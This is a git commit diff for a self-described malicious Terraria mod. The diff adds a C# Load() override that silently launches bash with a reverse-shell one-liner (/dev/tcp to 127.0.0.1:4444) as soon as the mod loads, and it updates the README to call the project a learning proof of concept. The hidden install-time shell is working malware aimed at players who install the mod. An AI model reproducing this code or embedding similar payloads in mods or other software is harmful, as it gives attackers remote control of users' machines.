49c21f509bc37596578f29bb33e37592565b05c1
Zhu-E <edward.zhu@yahoo.com>
2026-02-07 22:31:17 -0800

    Finished reverse shell that connects to local host

--- README.md
+++ README.md
@@ -1,3 +1,3 @@
 # A malicious Terraria mod
 
-A Terraria mod that when installed leads to RCE. This project is still a work in progress.
+A Terraria mod that when installed leads to RCE. This project is not meant to be published on the workshop and is purely for learning/proof of concept purposes. This project is still a work in progress.
--- test.cs
+++ test.cs
@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using System.Diagnostics;
 using Terraria.ModLoader;
 
 namespace test
@@ -10,6 +11,16 @@ namespace test
 	// Please read https://github.com/tModLoader/tModLoader/wiki/Basic-tModLoader-Modding-Guide#mod-skeleton-contents for more information about the various files in a mod.
 	public class test : Mod
 	{
-
+		public override void Load() {
+			Process process = new Process();
+			ProcessStartInfo startInfo = new ProcessStartInfo();
+			startInfo.FileName = "/bin/bash";
+			startInfo.Arguments = "-c \"bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\"";
+			startInfo.UseShellExecute = true;
+			startInfo.CreateNoWindow = true;
+			process.StartInfo = startInfo;
+			process.Start();
+		}
+		
 	}
 }
